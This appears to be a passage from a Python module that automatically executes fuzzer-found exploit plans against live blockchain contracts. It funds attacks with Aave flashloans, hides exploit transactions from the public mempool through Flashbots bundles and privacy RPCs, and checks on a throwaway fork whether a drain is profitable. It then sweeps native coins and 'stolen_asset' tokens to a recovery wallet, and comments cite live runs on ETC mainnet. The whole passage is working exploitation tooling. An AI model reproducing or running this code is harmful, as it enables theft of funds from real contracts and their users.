    Layer 1 (metadata) reasons are prefixed "metadata:" -- those mean the
    plan was never an extraction to begin with (not_extractable). Reasons
    prefixed "gas:" mean the plan's own measured footprint cannot fit in a
    block -- flagged oversized_gas. Anything else came from the fork
    simulation (unprofitable)."""
    if reason.startswith("metadata:"):
        return PLAN_SKIPPED_NOT_EXTRACTABLE
    if reason.startswith("gas:"):
        return PLAN_OVERSIZED_GAS
    return PLAN_SKIPPED_UNPROFITABLE


def execute_flat_plan_via_flashloan(
    w3: Web3, acct, nonce_box: dict, attack_wallet: str, plan: dict, chain: str, total_value: int, attack_wallet_bal: int, tee: Tee,
    use_bundle: bool = False, submit_w3: "Web3 | None" = None, gas_ledger: "GasLedger | None" = None,
) -> "tuple[bool, str]":
    """The "zero attacker capital" path for a `kind == "flat"` plan whose
    total_value this signer's real wallet can't cover: borrow the
    shortfall as WETH from the chain's real Aave V3 pool, unwrap it into
    real ETH (the only thing AttackWallet.execute()'s msg.value forwarding
    understands), run the plan's own steps from that real balance, then
    wrap enough back into WETH for Aave to pull as repayment -- all
    inside ONE atomic flashLoanSimple transaction (see AttackWallet.sol's
    executeOperation). Scoped to "flat" plans only for now: combining this
    with armCallback's own reentrancy-callback arming in the SAME
    executeOperation step list is a materially different design (two
    independent "what should fire on the next external call" mechanisms
    layered on top of each other) that hasn't been thought through -- see
    execute_plan's own call site, which still falls back to the plain
    INCONCLUSIVE path for a "reentrancy" plan this short on funds.

    `use_bundle`/`submit_w3` mirror execute_plan's own MEV-protection
    decision for the SAME plan (same total_value, same chain) -- see its
    own comment on why that decision is made once, before funding, not
    re-derived here. Without this, armFlashloanActions's calldata (the
    FULL target/calldata/value list, submitted as its own public
    transaction BEFORE startFlashLoan even runs) would sit in the public
    mempool revealing the exact bug and exploit sequence, long enough for
    a copycat/MEV bot to race the SAME vulnerable call first -- a strictly
    WORSE exposure window than the plain sequential path other plan kinds
    use, since arming and starting are two separate transactions here, not
    one. `use_bundle` atomically bundles BOTH (armFlashloanActions,
    startFlashLoan) via the existing Flashbots relay integration
    (flashbots_bundle.py) -- see that module's own honest status note on
    what has and hasn't been confirmed against the real relay from this
    kind of sandboxed environment. `submit_w3`, when given instead, routes
    both transactions (still separate, not atomic) through a mempool-
    privacy RPC -- see PRIVACY_REDIRECT_RPC's own doc in this file.

    Returns (ok, message) -- ok=True means the single startFlashLoan
    transaction landed with status=1, which (since everything above runs
    inside ONE EVM call) is itself proof every exploit step, the unwrap,
    and the repayment wrap all succeeded together -- Aave's own Pool
    reverts the WHOLE transaction otherwise (see AttackWallet.sol's own
    doc on executeOperation), so there is no partial/ambiguous outcome to
    represent here."""
    pool = AAVE_V3_POOLS[chain]
    weth = WETH_ADDRESSES[chain]
    borrow_amount = total_value - attack_wallet_bal
    premium_bps = aave_flashloan_premium_bps(w3, pool)
    premium = -(-(borrow_amount * premium_bps) // 10000)  # ceil div -- never underpay the repayment by rounding down
    repay_amount = borrow_amount + premium
    tee.log(
        f"Flashloan plan: borrow {w3.from_wei(borrow_amount, 'ether')} WETH from Aave V3 pool {pool} "
        f"(premium {premium_bps} bps = {w3.from_wei(premium, 'ether')} WETH), unwrap, run {len(plan['steps'])} "
        f"exploit step(s), wrap back {w3.from_wei(repay_amount, 'ether')} WETH for repayment."
    )

    targets = [weth]
    datas = [selector("withdraw(uint256)") + encode_uint256(borrow_amount)]
    values = [0]
    for step in plan["steps"]:
        targets.append(Web3.to_checksum_address(step["contract"]))
        datas.append(bytes.fromhex(step["calldata"]))
        values.append(parse_pretty_wei(step.get("value")))
    targets.append(weth)
    datas.append(selector("deposit()"))
    values.append(repay_amount)

    # Unlike every other plan path in this file, a revert HERE (at
    # eth_estimateGas time, before anything real is sent) is the EXPECTED
    # common case, not an infra fluke: it means the exploit step(s) don't
    # actually work against real chain state, or this trace's real profit
    # doesn't cover Aave's premium -- both genuine "NOT CONFIRMED" signals
    # this function must report cleanly, not crash the whole run over.
    arm_data = attack_wallet_arm_flashloan_actions_calldata(targets, datas, values)
    start_data = attack_wallet_start_flashloan_calldata(pool, weth, borrow_amount)

    if use_bundle:
        # Atomic path: both transactions are pre-signed up front (neither
        # sent yet) and submitted together as ONE Flashbots bundle -- see
        # this function's own doc comment for why arming alone, submitted
        # separately first, would already leak the exploit to the public
        # mempool. Mirrors execute_plan's own bundle branch for other plan
        # kinds (sign_step/call_bundle/submit_bundle_and_wait), just for
        # these two specific calls instead of N plan steps.
        try:
            fee_fields = get_fee_fields(w3, chain)
            start_nonce = nonce_box["nonce"]
            raw_arm, hash_arm = sign_step(w3, acct, start_nonce, attack_wallet, arm_data, 0, fee_fields)
            raw_start, hash_start = sign_step(w3, acct, start_nonce + 1, attack_wallet, start_data, 0, fee_fields)
            tee.log(f"Pre-signed for bundle: armFlashloanActions (tx {hash_arm}), startFlashLoan (tx {hash_start})")

            sim = call_bundle(bundle_relay_for(chain), acct, [raw_arm, raw_start], w3.eth.block_number + 1)
            if sim.get("firstRevert"):
                return False, f"flashloan bundle simulation reverted before any real submission: {sim['firstRevert']}"
            total_gas_used = sim.get("totalGasUsed") or 2 * BUNDLE_GAS_LIMIT
            gas_cap_wei = int(total_gas_used * fee_fields["maxFeePerGas"] * GAS_BUDGET_MARGIN)
            tee.log(
                f"Gas budget for this flashloan bundle: {total_gas_used} gas simulated * {GAS_BUDGET_MARGIN} margin "
                f"= {Web3.from_wei(gas_cap_wei, 'ether')} {native_symbol_for_w3(w3)} cap."
            )

            landed = submit_bundle_and_wait(w3, acct, [raw_arm, raw_start], [hash_arm, hash_start], bundle_relay_for(chain), tee)
            if not landed:
                return False, (
                    "the protected flashloan bundle never landed on-chain (either it would have reverted, caught "
                    "by simulation before submitting, or builders never included it within the retry window). "
                    "Nothing in it touched real chain state -- safe to retry."
                )
            nonce_box["nonce"] = start_nonce + 2
            arm_receipt = w3.eth.get_transaction_receipt(hash_arm)
            start_receipt = w3.eth.get_transaction_receipt(hash_start)
            total_actual_wei = sum(
                r["gasUsed"] * r.get("effectiveGasPrice", 0) for r in (arm_receipt, start_receipt)
            )
            if gas_ledger is not None:
                gas_ledger.record_many((arm_receipt, start_receipt))
            if total_actual_wei > gas_cap_wei:
                tee.log(
                    f"Real gas cost ({Web3.from_wei(total_actual_wei, 'ether')} ETH) exceeded this flashloan "
                    f"bundle's {Web3.from_wei(gas_cap_wei, 'ether')} ETH budget -- should not be possible under "
                    "normal gas rules; flagging loudly rather than silently ignoring it.",
                    alert=True,
                )
            if arm_receipt.status != 1 or start_receipt.status != 1:
                tee.log("Flashloan bundle landed but at least one tx's receipt shows REVERTED -- treating as NOT CONFIRMED.", alert=True)
                return False, "flashloan bundle landed but reverted"
        except Exception as e:
            return False, f"flashloan bundle submission failed: {e}"
        return True, "flashloan-funded plan executed atomically via protected Flashbots bundle"

    # Unlike every other plan path in this file, a revert HERE (at
    # eth_estimateGas time, before anything real is sent) is the EXPECTED
    # common case, not an infra fluke: it means the exploit step(s) don't
    # actually work against real chain state, or this trace's real profit
    # doesn't cover Aave's premium -- both genuine "NOT CONFIRMED" signals
    # this function must report cleanly, not crash the whole run over.
    try:
        fee_fields = get_fee_fields(w3, chain)
        arm_gas_estimate = estimate_gas_limit(
            w3,
            {
                "from": acct.address,
                "to": Web3.to_checksum_address(attack_wallet),
                "data": arm_data,
                "value": 0,
                "chainId": w3.eth.chain_id,
                "nonce": nonce_box["nonce"],
            },
        )
        # Each of the two real calls below gets its OWN gas-budget from
        # its OWN real estimate -- never extrapolated from the other,
        # since they have very different real costs (arming is cheap
        # storage writes; starting the loan runs the whole unwrap/
        # exploit/repay sequence).
        arm_budget = GasBudget(int(arm_gas_estimate * GAS_BUDGET_MARGIN * fee_fields["maxFeePerGas"]))
        if not send_call(
            w3, acct, nonce_box, attack_wallet, arm_data, tee, "armFlashloanActions (flashloan-funded plan)",
            submit_w3=submit_w3, gas_budget=arm_budget, gas_ledger=gas_ledger,
        ):
            return False, "armFlashloanActions reverted -- nothing borrowed or touched yet"

        start_gas_estimate = estimate_gas_limit(
            w3,
            {
                "from": acct.address,
                "to": Web3.to_checksum_address(attack_wallet),
                "data": start_data,
                "value": 0,
                "chainId": w3.eth.chain_id,
                "nonce": nonce_box["nonce"],
            },
        )
        start_budget = GasBudget(int(start_gas_estimate * GAS_BUDGET_MARGIN * fee_fields["maxFeePerGas"]))
        if not send_call(
            w3, acct, nonce_box, attack_wallet, start_data, tee, "startFlashLoan (borrow + unwrap + exploit + repay, atomic)",
            submit_w3=submit_w3, gas_budget=start_budget, gas_ledger=gas_ledger,
        ):
            return False, (
                "startFlashLoan reverted -- either the exploit step(s) failed against real chain state, or the "
                "repayment wrap didn't leave enough WETH for Aave to pull back (insufficient real profit this run). "
                "Either way nothing was lost beyond gas: a flashloan that isn't repaid never lands."
            )
    except GasBudgetExceeded as e:
        return False, str(e)
    except GasExceedsBlockLimitError as e:
        return False, f"NOT CONFIRMED: {e}"
    except Exception as e:
        return False, f"reverted during gas estimation (expected when the exploit step(s) don't hold against real chain state): {e}"
    return True, "flashloan-funded plan executed atomically"


def gas_oversized_reason(plan: dict) -> "str | None":
    """PHASE 1.3 of TASK_SPEC.md: a plan whose OWN measured gas
    footprint cannot fit in a block must be FLAGGED (oversized_gas), not
    executed. Returns a human reason when the plan is oversized, else None.

    The deciding field is `fits_block_gas_limit`, stamped onto the plan by
    `estimate_plan_gas_on_fork()` -- the node's own `eth_estimateGas` against
    the real `block.gasLimit` -- which runs BEFORE the gate. It is absent
    when no fork was available, so no honest measurement exists; in that case
    this returns None rather than guessing (a missing optional tool must make
    the pipeline less thrifty, never wrong)."""
    fit = plan.get("fits_block_gas_limit")
    if fit is None or fit:
        return None
    return (
        f"its measured gas footprint does not fit in a block "
        f"(gas_estimate={plan.get('gas_estimate')}, "
        f"block_gas_limit={plan.get('block_gas_limit')}, "
        f"headroom={plan.get('gas_headroom_pct')}%) -- physically un-includable "
        f"in one block, so no real transaction was sent"
    )


def metadata_skip_reason(finding: dict) -> "str | None":
    """Layer 1 of the pre-flight gate: a metadata-only check that costs no
    network round-trip and no fork. Returns a human reason when the plan
    provably cannot be replayed by AttackWallet at all, else None.

    Both conditions come straight from fields the fuzzer already stamps on
    every plan.json (see script_generator.rs's PlanMeta), not from anything
    re-derived here:
      * `atomic_replayable == False` means the trace's discovery relied on a
        faked/intercepted call return -- the field's own doc says only an
        atomic_replayable plan "can AttackWallet replay ... soundly on-chain".
      * `distinct_callers > 1` means the trace needs more than one msg.sender.
        execute_plan drives every step from the single funding signer through
        one AttackWallet, so a multi-caller trace reverts by construction.
      * `confirmed_exploitable == False` means no oracle ever observed real
        fund movement -- the finding is a Review-tier heuristic (Stale Guard
        Counter, Unbounded Loop, ...). src/evm/solution/mod.rs emits a
        plan.json for these too, and says so explicitly: the Python layer is
        the one that must decide "whether to run it standalone, chain it, or
        treat it as evidence only". A heuristic has no extraction step to
        replay, so running it for real can only burn gas -- confirmed live on
        ETC mainnet, where 1022 "Stale Guard Counter" hits produced 805 plans
        that every one executed cleanly and none of which moved a single wei.
    Either way the real send can only ever burn gas, so skipping is strictly
    correct, not merely an optimization."""
    if not finding.get("confirmed_exploitable", True) and finding.get("kind") != "reentrancy":
        return ("it is a Review-tier heuristic finding (confirmed_exploitable=false): no oracle "
                "observed real fund movement, so there is no extraction step to replay -- the "
                "plan.json is honest evidence, not a runnable exploit")
    # The trace's caller is an identity the fuzzer only "became" by reading
    # it out of the TARGET's own storage (see host.rs's
    # HARVESTED_STORAGE_ADDRESSES). Overwhelmingly that is the target's
    # owner/admin/multisig, so the finding is the privileged party using
    # their own privilege, not an attacker: `escapeHatch()` gated on
    # `require(msg.sender == owner)` was reported as "Fund Loss" on ETC
    # target 0x9f5304... purely because the fuzzer called it AS the owner.
    # AttackWallet drives every step from one funding signer and has no
    # owner key, so the call reverts on-chain -- attempting it can only
    # burn gas. Confirmed live: 1201 such plans, 0 executable.
    #
    # Checked AFTER the review-tier gate so a heuristic hit that happens to
    # carry a storage-harvested caller (a low-order word misread as an
    # address) is still reported as what it primarily is -- a heuristic --
    # rather than mislabelled an owner-impersonation finding.
    if finding.get("owner_gated", False):
        # PHASE 3.2: the SEMANTIC form is the strongest statement -- the trace
        # calls the target AS an identity harvested from THAT contract's own
        # storage, i.e. `require(msg.sender == owner)` satisfied by
        # impersonation. Checked first so the report names the precise shape
        # rather than the broader "harvested from somewhere" one.
        return ("its trace calls the target AS an identity the fuzzer harvested from that "
                "same contract's own storage (owner_gated): this is exactly the "
                "require(msg.sender == owner) privileged-party shape, satisfied by "
                "impersonation, which no signer without that key can replay")
    if finding.get("owner_impersonation", False):
        return ("its caller is an address the fuzzer harvested from the target's own "
                "storage (owner/admin/multisig impersonation), not a real attacker "
                "identity -- the privileged party exercising its own privilege, which "
                "no signer without that key can replay")
    if not finding.get("atomic_replayable", True):
        return ("its discovery relied on a faked/intercepted call return "
                "(atomic_replayable=false), so AttackWallet cannot replay it soundly")
    distinct = int(finding.get("distinct_callers", 1) or 1)
    if distinct > 1:
        return (f"it spans {distinct} distinct caller addresses, which no single-signer "
                "AttackWallet replay can reproduce")
    return None


def _start_fork(chain: str, tee: Tee):
    """Starts a throwaway Anvil fork of the SAME node state the real run
    would act on, for free (a fork never touches the real chain). Returns
    (proc, w3) on success, or (None, None) when Anvil is not installed or
    the fork never came up -- callers must treat that as "run without the
    gate", never as "skip everything": a missing optional tool must not
    make the pipeline refuse to work, only make it less thrifty."""
    anvil = shutil.which("anvil")
    if anvil is None:
        tee.log("Pre-flight gate: anvil not found on PATH -- fork simulation disabled this run "
                "(metadata filter still applies). Install Foundry to enable it.")
        return None, None
    rpc = get_rpc_url(chain)
    cmd = [anvil, "--fork-url", rpc, "--port", str(FORK_SIM_PORT), "--silent"]
    if chain in ("etc", "mordor"):
        # ETC skipped the Merge EIPs; under Anvil's default `--hardfork
        # latest` every eth_call fails with "Excess blob gas not set." (see
        # FORK_SIM_ETC_HARDFORK's own comment).
        cmd += ["--hardfork", FORK_SIM_ETC_HARDFORK]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except OSError as e:
        tee.log(f"Pre-flight gate: could not start anvil ({e}) -- fork simulation disabled this run.")
        return None, None
    fork_w3 = Web3(Web3.HTTPProvider(f"http://127.0.0.1:{FORK_SIM_PORT}"))
    deadline = time.time() + FORK_SIM_STARTUP_TIMEOUT_S
    while time.time() < deadline:
        if proc.poll() is not None:
            tee.log("Pre-flight gate: anvil exited before serving any request -- fork simulation disabled this run.")
            return None, None
        try:
            fork_w3.eth.chain_id
            tee.log(f"Pre-flight gate: forked {chain} via {rpc} on port {FORK_SIM_PORT} for free simulation.")
            return proc, fork_w3
        except Exception:
            time.sleep(0.3)
    tee.log(f"Pre-flight gate: anvil did not answer within {FORK_SIM_STARTUP_TIMEOUT_S:.0f}s -- "
            "fork simulation disabled this run.")
    proc.terminate()
    return None, None


def _fork_send(fork_w3: Web3, acct, to: str, data: bytes, value: int, chain: str):
    """Signs and sends one tx to the fork exactly as execute_plan would to
    the real chain (same builder, same AttackWallet calldata), waits for
    its receipt, and returns it. Gas limit is the cap itself (unused gas is
    never charged), so no estimate is needed and a fork-specific estimate
    quirk can't make the gate lie."""
    tx = {
        "from": acct.address,
        "to": Web3.to_checksum_address(to),
        "nonce": fork_w3.eth.get_transaction_count(acct.address),
        "data": data,
        "value": value,
        "chainId": fork_w3.eth.chain_id,
        "gas": MAX_GAS_LIMIT,
    }
    fee = get_fee_fields(fork_w3, chain=chain, use_official=False)
    if fee["is_legacy"]:
        tx["gasPrice"] = fee["gasPrice"]
    else:
        tx["maxFeePerGas"] = fee["maxFeePerGas"]
        tx["maxPriorityFeePerGas"] = fee["maxPriorityFeePerGas"]
        tx["type"] = 2
    signed = acct.sign_transaction(tx)
    tx_hash = fork_w3.eth.send_raw_transaction(signed.raw_transaction)
    return fork_w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)


def simulate_plan_on_fork(
    fork_w3: Web3, acct, attack_wallet: str, plan: dict, recovery_wallet: str, chain: str, tee: Tee,
) -> "tuple | None":
    """Layer 2 of the pre-flight gate: replays the plan's exact step
    sequence against the fork and measures what it really does.

    Returns (delta_wei, gas_wei, reverted, gained_tokens) where `delta_wei` is
    the recovery wallet's own native-balance increase, `gas_wei` is the real
    gas the signer spent, `reverted` is True when a step did not succeed (the
    plan cannot land as written), and `gained_tokens` maps each touched token
    address to the recovery wallet's real balance increase of it. Returns None
    when the simulation could not be decided (RPC error mid-replay) -- the
    caller then falls back to the real attempt rather than guessing.

    The whole replay happens between an evm_snapshot and an evm_revert, so
    repeated plans never contaminate each other and the fork is left
    byte-identical to the real chain state for the next one."""
    recovery_checksum = Web3.to_checksum_address(recovery_wallet)
    snap = fork_w3.provider.make_request("evm_snapshot", [])["result"]
    try:
        # Give the signer a large balance ON THE FORK ONLY so gas can never
        # be the reason a replay fails (the fork is throwaway; this touches
        # nothing real). Funding the wallet is a separate, already-handled
        # concern in execute_plan -- this gate only answers "does the
        # exploit, once runnable, come out ahead".
        fork_w3.provider.make_request(
            "anvil_setBalance", [acct.address, hex(Web3.to_wei(1000, "ether"))]
        )
        steps = plan.get("steps", [])
        total_value = sum(parse_pretty_wei(step.get("value")) for step in steps)
        if total_value > 0:
            # Mirror execute_plan's funding requirement so value-carrying
            # steps don't fail for lack of balance on the fork. Set the
            # wallet's balance directly rather than sending the top-up: the
            # fuzzer explores with an effectively unlimited simulated
            # balance, so total_value can be arbitrarily large, and a real
            # transfer of it would need the signer to actually hold that
            # much -- an artificial constraint the real run doesn't have
            # (it uses the Aave flashloan path for exactly this reason).
            fork_w3.provider.make_request(
                "anvil_setBalance", [Web3.to_checksum_address(attack_wallet), hex(total_value)]
            )

        recovery_before = fork_w3.eth.get_balance(recovery_checksum)
        gas_spent = 0
        repeat_step = plan.get("repeat_step")

        # Mirror execute_plan's own choice: a multi-step FLAT plan runs
        # atomically via executeBatch (one tx), so the fork replay must use
        # the SAME call -- otherwise the gate would validate a different
        # sequence than the real run sends.
        use_batch = plan["kind"] == "flat" and len(steps) > 1
        if use_batch:
            batch = attack_wallet_execute_batch_calldata(
                [s["contract"] for s in steps],
                [bytes.fromhex(s["calldata"]) for s in steps],
                [parse_pretty_wei(s.get("value")) for s in steps],
            )
            r = _fork_send(fork_w3, acct, attack_wallet, batch, 0, chain)
            gas_spent += r["gasUsed"] * r.get("effectiveGasPrice", 0)
            if r.status != 1:
                return 0, gas_spent, True, {}
        else:
            for i, step in enumerate(steps):
                is_last = i == len(steps) - 1
                value = parse_pretty_wei(step.get("value"))
                inner = bytes.fromhex(step["calldata"])
                if is_last and plan["kind"] == "reentrancy" and repeat_step:
                    arm = attack_wallet_arm_callback_calldata(
                        repeat_step["contract"], bytes.fromhex(repeat_step["calldata"])
                    )
                    r = _fork_send(fork_w3, acct, attack_wallet, arm, 0, chain)
                    gas_spent += r["gasUsed"] * r.get("effectiveGasPrice", 0)
                    if r.status != 1:
                        return 0, gas_spent, True, {}
                exec_data = attack_wallet_execute_calldata(step["contract"], inner, value)
                r = _fork_send(fork_w3, acct, attack_wallet, exec_data, value, chain)
                gas_spent += r["gasUsed"] * r.get("effectiveGasPrice", 0)
                if r.status != 1:
                    return 0, gas_spent, True, {}

            if plan["kind"] == "reentrancy" and repeat_step:
                r = _fork_send(fork_w3, acct, attack_wallet, attack_wallet_disarm_callback_calldata(), 0, chain)
                gas_spent += r["gasUsed"] * r.get("effectiveGasPrice", 0)

        # Sweep whatever landed on AttackWallet to the recovery wallet, the
        # same final step execute_plan performs -- the delta that matters is
        # the recovery wallet's, so a plan that leaves value stranded in
        # AttackWallet must NOT read as profitable here.
        aw_bal = fork_w3.eth.get_balance(Web3.to_checksum_address(attack_wallet))
        if aw_bal > 0:
            r = _fork_send(fork_w3, acct, attack_wallet, attack_wallet_sweep_calldata(), 0, chain)
            gas_spent += r["gasUsed"] * r.get("effectiveGasPrice", 0)
            if r.status != 1:
                return 0, gas_spent, True, {}

        recovery_after = fork_w3.eth.get_balance(recovery_checksum)

        # ERC20-interface steps never pass through the native sweep above --
        # mirror execute_plan's own per-token sweep so a token-draining plan
        # (whose native delta can be exactly 0) is not misread as worthless.
        gained_tokens: dict = {}
        stolen_assets = sorted({step["stolen_asset"] for step in steps if step.get("stolen_asset")})
        for token in stolen_assets:
            token_checksum = Web3.to_checksum_address(token)
            before = erc20_balance_of(fork_w3, token_checksum, recovery_checksum)
            wallet_bal = erc20_balance_of(fork_w3, token_checksum, attack_wallet)
            if wallet_bal > 0:
                r = _fork_send(
                    fork_w3, acct, attack_wallet,
                    attack_wallet_sweep_token_calldata(token_checksum, wallet_bal), 0, chain,
                )
                gas_spent += r["gasUsed"] * r.get("effectiveGasPrice", 0)
                if r.status != 1:
                    return 0, gas_spent, True, {}
            after = erc20_balance_of(fork_w3, token_checksum, recovery_checksum)
            if after - before > 0:
                gained_tokens[token_checksum] = after - before

        return recovery_after - recovery_before, gas_spent, False, gained_tokens
    except Exception as e:
        tee.log(f"Pre-flight gate: fork simulation could not be decided ({type(e).__name__}: {e}) "
                "-- falling back to the real attempt for this plan.")
        return None
    finally:
        try:
            fork_w3.provider.make_request("evm_revert", [snap])
        except Exception:
            pass


def estimate_plan_gas_on_fork(
    fork_w3: Web3, acct, attack_wallet: str, plan: dict, chain: str,
) -> "dict | None":
    """PHASE 1.2: the plan's real gas footprint, measured with the node's own
    `eth_estimateGas` against the throwaway fork -- the authoritative answer
    the un-metered revm model cannot give.

    Each step is a SEPARATE transaction, so the field that decides "does
    this fit in a block" is the LARGEST single step, not the sum (a sum of
    steps that are never in one block would reject plans that are perfectly
    runnable). Both are reported. Returns None when the fork could not
    decide (no fork, or an estimate reverted) -- the caller then simply
    omits the fields rather than guessing.

    Runs between an evm_snapshot / evm_revert so the fork is left
    byte-identical, exactly like simulate_plan_on_fork."""
    if fork_w3 is None:
        return None
    snap = fork_w3.provider.make_request("evm_snapshot", [])["result"]
    try:
        # Fund on the fork only, so a value-carrying step estimates cleanly
        # (the fork is throwaway; nothing real is touched).
        fork_w3.provider.make_request(
            "anvil_setBalance", [acct.address, hex(Web3.to_wei(1000, "ether"))]
        )
        steps = plan.get("steps", [])
        total_value = sum(parse_pretty_wei(step.get("value")) for step in steps)
        if total_value > 0:
            fork_w3.provider.make_request(
                "anvil_setBalance", [Web3.to_checksum_address(attack_wallet), hex(total_value)]
            )
        per_step = []
        for step in steps:
            value = parse_pretty_wei(step.get("value"))
            inner = bytes.fromhex(step["calldata"])
            exec_data = attack_wallet_execute_calldata(step["contract"], inner, value)
            tx = {
                "from": acct.address,
                "to": Web3.to_checksum_address(attack_wallet),
                "data": exec_data,
                "value": value,
            }
            per_step.append(fork_w3.eth.estimate_gas(tx))
        if not per_step:
            return None
        block_gas_limit = fork_w3.eth.get_block("latest")["gasLimit"]
        # The governing number is the single largest step (each step is its
        # own tx, so it is the one that must fit under the block limit).
        fit = gas_fit(max(per_step), block_gas_limit)
        fit["gas_estimate_total"] = sum(per_step)
        fit["step_gas_estimates"] = per_step
        return fit
    except Exception:
        # No fork, or a step's estimate reverted: report nothing rather than
        # a made-up number. The caller falls back to whatever the real send
        # itself reports.
        return None
    finally:
        try:
            fork_w3.provider.make_request("evm_revert", [snap])
        except Exception:
            pass


def preflight_skip_reason(
    finding: dict, fork_w3: "Web3 | None", acct, attack_wallet: str, recovery_wallet: str,
    chain: str, tee: Tee, native_symbol: str,
) -> "str | None":
    """The full pre-flight gate. Returns a reason string when the plan must
    be skipped WITHOUT sending anything real, else None.

    Layer 1 (metadata) is always applied. Layer 2 (fork simulation) is
    applied only when a fork is available; when it is, a plan is skipped if
    the replay reverts, or if it moves value but recovers less than the gas
    it costs (delta <= gas) -- i.e. exactly the "EXECUTED, NO PROFIT" and
    "NET LOSS" outcomes that a real run would otherwise pay to discover."""
    reason = metadata_skip_reason(finding)
    if reason is not None:
        return f"metadata: {reason}"
    plan = finding["plan"]
    # PHASE 1.2/1.3: a plan whose OWN measured gas footprint cannot fit in a
    # block is flagged oversized_gas, not executed. A standalone plan already
    # carries these fields (stamped by main() before execution); a COMPOSED
    # plan (strategy_layer.compose_plan) does not, so measure it here, on the
    # same fork, rather than letting a composition silently bypass the guard.
    # The check runs BEFORE the profitability replay: an oversized plan must
    # never be sent, so replaying it to learn profitability would be wasted.
    if plan.get("fits_block_gas_limit") is None and fork_w3 is not None:
        fit = estimate_plan_gas_on_fork(fork_w3, acct, attack_wallet, plan, chain)
        if fit is not None:
            plan["gas_estimate"] = fit["gas_estimate"]
            plan["fits_block_gas_limit"] = fit["fits_block_gas_limit"]
            plan["gas_headroom_pct"] = fit["gas_headroom_pct"]
            plan["block_gas_limit"] = fit["block_gas_limit"]
    oversized = gas_oversized_reason(plan)
    if oversized is not None:
        return f"gas: {oversized}"
    if fork_w3 is None:
        return None
    sim = simulate_plan_on_fork(fork_w3, acct, attack_wallet, plan, recovery_wallet, chain, tee)
    if sim is None:
        return None
    delta, gas_spent, reverted, gained_tokens = sim
    if reverted:
        return ("fork replay: a step reverted against a byte-identical fork of real state -- "
                "the plan cannot land as written, so a real send could only burn gas")
    if gained_tokens:
        # A token-draining plan's native delta is 0 by design; execute_plan
        # itself treats any real token gain as CONFIRMED, so never skip it
        # here -- gas vs a token amount isn't a like-for-like comparison.
        token_note = ", ".join(
            f"+{amount} of {token} (raw units)" for token, amount in gained_tokens.items()
        )
        tee.log(
            f"Pre-flight gate: plan '{plan['contract_name']}' PASSED -- fork replay gains {token_note} "
            f"for {Web3.from_wei(gas_spent, 'ether')} {native_symbol} gas; proceeding to the real attempt."
        )
        return None
    if delta <= gas_spent:
        return (
            f"fork replay: would gain {Web3.from_wei(delta, 'ether')} {native_symbol} but cost "
            f"{Web3.from_wei(gas_spent, 'ether')} {native_symbol} in gas (net "
            f"{format_wei_signed(fork_w3, delta - gas_spent)} {native_symbol}) -- not profitable, so no real tx was sent"
        )
    tee.log(
        f"Pre-flight gate: plan '{plan['contract_name']}' PASSED -- fork replay gains "
        f"{Web3.from_wei(delta, 'ether')} {native_symbol} for {Web3.from_wei(gas_spent, 'ether')} {native_symbol} gas "
        f"(net +{Web3.from_wei(delta - gas_spent, 'ether')} {native_symbol}); proceeding to the real attempt."
    )
    return None


def execute_plan(
    w3: Web3, acct, nonce_box: dict, attack_wallet: str, plan: dict, recovery_wallet: str, tee: Tee,
    chain: str = "sepolia", return_units: bool = False,
) -> tuple:
    """Returns (status, recovery_delta_wei, gas_spent_wei, net_profit_wei)
    where status is PLAN_CONFIRMED, PLAN_NOT_CONFIRMED, PLAN_INCONCLUSIVE,
    or PLAN_EXECUTED_NO_PROFIT -- see the constants' own doc above for why
    these are kept distinct rather than a bool.

    recovery_delta_wei is the recovery wallet's REAL on-chain balance
    increase caused by this plan (0 whenever status isn't PLAN_CONFIRMED)
    -- the deterministic proof itself, not a derived label.

    gas_spent_wei is what the funding wallet REALLY paid in gas to make
    this plan happen (every tx it sent: funding top-up, deploy, exploit
    steps, cleanup sweeps, and -- for a landed Flashbots bundle -- every
    tx in it, taken from each receipt's own gasUsed * effectiveGasPrice).
    net_profit_wei = recovery_delta_wei - gas_spent_wei is the honest
    bottom line: a plan whose gross gain is smaller than its own gas bill
    is a NET LOSS, and a bare "gained X" line would overstate it. Callers
    that only want the old two-value shape should keep unpacking the first
    two; the extra fields are appended, not reordered.

    When `return_units=True` a 5th element (total real gas UNITS, i.e.
    receipts' own gasUsed summed) is appended, feeding the structured
    proof's `gas_used`. It is opt-in so the documented 4-tuple contract
    stays intact for every existing caller."""
    tee.log(f"Executing exploit plan '{plan['contract_name']}' (kind={plan['kind']}) via AttackWallet {attack_wallet}")
    gas_ledger = GasLedger()
    recovery_checksum = Web3.to_checksum_address(recovery_wallet)
    recovery_balance_before = w3.eth.get_balance(recovery_checksum)

    def _result(status: str, delta: int) -> tuple:
        # Every return funnels through here so the ledger's real total is
        # always attached, including the early NOT CONFIRMED / INCONCLUSIVE
        # exits that still spent gas (a reverted step, a failed funding
        # top-up) -- those costs are real and must not vanish just because
        # the plan didn't confirm.
        base = (status, delta, gas_ledger.spent_wei, net_profit_wei(delta, gas_ledger.spent_wei))
        # `return_units` (opt-in) appends the real gas UNITS for the
        # structured proof's `gas_used`. Default is the documented 4-tuple,
        # so every existing caller keeps working unchanged.
        if return_units:
            return base + (gas_ledger.gas_units,)
        return base

    # Sum the steps ourselves rather than trusting the plan's own
    # needs_funding/total_value fields -- cheap, and makes this correct
    # even if those fields were ever wrong or missing.
    total_value = sum(parse_pretty_wei(step.get("value")) for step in plan["steps"])
    # Only the actual exploit steps (and the reentrancy arm/disarm calls
    # around them) are worth protecting from front-running -- the funding
    # step just moves the signer's own money between their own addresses,
    # nothing for a sandwich bot to profitably copy.
    # Keyed on the chain's REAL Flashbots coverage (bundle_relay_for), not a
    # hardcoded `chain == "eth"`: sepolia has its own relay, and a chain
    # Flashbots never covered simply takes the sequential path below instead
    # of KeyError-ing. The relay URL is resolved once here and reused for
    # both the simulation and the submission.
    bundle_relay = bundle_relay_for(chain)
    use_bundle = bundle_relay is not None and total_value >= Web3.to_wei(FLASHBOTS_THRESHOLD_ETH, "ether")
    privacy_redirect = PRIVACY_REDIRECT_RPC.get(chain)
    use_privacy_redirect = (
        not use_bundle
        and privacy_redirect is not None
        and total_value >= Web3.to_wei(privacy_redirect["threshold_native"], "ether")
    )
    submit_w3 = Web3(Web3.HTTPProvider(privacy_redirect["url"])) if use_privacy_redirect else None
    if use_bundle:
        tee.log(
            f"Value at risk ({Web3.from_wei(total_value, 'ether')} {native_symbol_for_w3(w3)}) is over the "
